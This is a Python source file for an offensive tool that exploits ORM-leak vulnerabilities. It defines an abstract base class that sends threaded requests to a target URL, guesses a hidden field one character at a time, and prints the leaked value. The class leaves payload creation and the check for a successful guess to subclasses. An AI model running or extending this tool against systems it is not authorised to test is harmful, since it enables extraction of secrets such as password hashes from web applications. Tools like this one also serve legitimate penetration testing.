import argparse, datetime, json, requests, requests_cache, string, sys
from abc import ABC, abstractmethod
from typing import Optional
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Back, Style


class ORMLeakTest:
    def __init__(self, dump_val: str, payload: list|dict|str):
        self.dump_val = dump_val
        self.payload = payload

    def __repr__(self) -> str:
        return f"<ORMLeakTest dump_val={self.dump_val}>"


class ORMLeakResult:
    def __init__(self, test: ORMLeakTest, total_time: float, resp: requests.Response):
        self.test = test
        self.response = resp
        self.total_time = total_time


class BaseORMLeakAttack(ABC):
    command_name = ''
    command_description = ''

    def __init__(self, target: str='', requests_options: dict = {}, dumped_prefix: str = "", threads: int = 10, 
                 chars: str = string.ascii_letters + string.digits + string.punctuation + " "):
        requests_cache.install_cache(backend='memory')
        self.target = target
        # Needed for time-based where the characters need to be sorted
        self.chars = ''.join(sorted(chars))
        self.chars_len = len(self.chars)
        self.requests_options = requests_options
        self.dumped_prefix = dumped_prefix
        self.threads = threads
        self.is_contains_attack = False


    def request(self, method: str, url: str, **request_args) -> requests.Response:
        """
        Wrapper around requests that adds the requests options

        Args:
            method: the HTTP method
            url: the URL to send the request to
            **request_args: keyword arguments for requests

        Returns:
            the response
        """
        return requests.request(method, url, **request_args, **self.requests_options)


    def build_payloads(self, known_dump: str) -> list[ORMLeakTest]:
        """
        Builds a list payloads using characters in self.test_characters to try and leak the next characters

        Args:
            known_dump: the currently known dumped value

        Returns:
            A list ORMLeakTest instances to test for characters
        """
        tests: list[list[ORMLeakTest]] = []

        def add_test(test_dump_val):
            payload = self.create_payload(test_dump_val)
            tests.append(ORMLeakTest(test_dump_val, payload))

        # Need to do pairwise comparisons hence why the different implementation and
        # return in comparison to base class
        for c in self.chars:
            add_test(known_dump + c)
            if self.is_contains_attack:
                add_test(c + known_dump)
        return tests


    def send_payload(self, ormleak_test: ORMLeakTest) -> ORMLeakResult:
        payload = ormleak_test.payload
        s_time = datetime.datetime.now()
        resp = self.send_request(payload)
        e_time = datetime.datetime.now()
        t_time = (e_time - s_time).total_seconds()
        return ORMLeakResult(ormleak_test, t_time, resp)


    def handle_pre_check_fail(self, exception: Exception):
        """
        Handler for when a pre-check fails

        Args:
            exception: the raised exception
        """
        ...


    def pre_checks(self) -> bool:
        """
        Checks that are performed before exploitation.

        Add your checks here to verify an endpoint is vulnerable before exploiting.

        Raises:
            Exception: An exception if a pre-check failed
        """
        return True


    def determine_hit(self, futures: list[ORMLeakResult]) -> Optional[ORMLeakResult]:
        for result in futures:
            print(f"\r{Style.DIM}dumped value: {Style.RESET_ALL}{Fore.GREEN}{Style.BRIGHT}{result.test.dump_val}{Style.RESET_ALL}", end='')
            sys.stdout.flush()
            if self.was_success_result(result.response):
                return result
        return None


    def exploit(self) -> Optional[str]:
        """
        Exploits an ORM leak vulnerability, prints progress and returns the value

        Returns:
            a dumped value
        """
        try:
            self.pre_checks()
        except Exception as e:
            self.handle_pre_check_fail(e)
            return None
        known_dump_val = self.dumped_prefix
        while True:
            found = False
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = executor.map(
                    self.send_payload,
                    self.build_payloads(known_dump_val)
                )
                
                result = self.determine_hit(futures)
                if (result is not None):
                    found = True
                    known_dump_val = result.test.dump_val

                executor.shutdown(cancel_futures=True)

            if not found:
                break
        print(f"\r{Style.DIM}dumped value: {Style.RESET_ALL}{Fore.GREEN}{Style.BRIGHT}{known_dump_val}{Style.RESET_ALL} ")
        return known_dump_val
    

    def print_fail_msg(self, msg: str):
        print(f"{Back.RED}{Fore.WHITE}{Style.BRIGHT}FAILED: {msg}{Style.RESET_ALL}")
    

    @abstractmethod
    def create_payload(self, test_value: str) -> list|dict|str:
        """
        Creates the ORM Leak payload

        Args:
            test_value: The string value to test if sensitive contains/starts with this value
        """
        raise NotImplementedError
    

    @abstractmethod
    def send_request(self, payload: list|str|dict) -> requests.Response:
        """
        How to send the request to the target instance
        IMPORTANT! Use self.request for sending requests

        Args:
            payload: The ORM Leak payload to send to the target

        Returns:
            A requests Response
        """
        raise NotImplementedError
    

    @abstractmethod
    def was_success_result(self, resp: requests.Response) -> bool:
        """
        Checks if the response indicated a successful attempt at leaking the next character

        Args:
            resp: The response from the request testing for a character

        Returns:
            True if the response indicated a hit
        """
        raise NotImplementedError


    @classmethod
    def add_options(cls, parser: argparse.ArgumentParser, ignore_chars_option=False) -> argparse.ArgumentParser:
        parser.add_argument(
            'target',
            help='target url',
            type=str
        )

        parser.add_argument(
            '--requests-options',
            help='additional options for requests as a JSON string (e.g. {"headers":{"cookies":"nomnom"}})',
            default={},
            type=json.loads
        )

        if not ignore_chars_option:
            parser.add_argument(
                '--chars',
                help='character list to use in search',
                default=string.ascii_letters+string.digits+string.punctuation,
                type=str
            )

        parser.add_argument(
            '-t', '--threads',
            help='number of threads to use, but if doing a ORM time-based attack this would be the start number of threads threads',
            default=5,
            type=int
        )

        parser.add_argument(
            '-p', '--dumped-prefix',
            help='known prefix for the dumped value',
            default='',
            type=str
        )
        return parser
    

    @classmethod
    def add_command_args(cls, subparsers):
        parser: argparse.ArgumentParser = subparsers.add_parser(
            cls.command_name,
            formatter_class=argparse.ArgumentDefaultsHelpFormatter,
            description=cls.command_description
        )
        parser = cls.add_options(parser)
        return parser
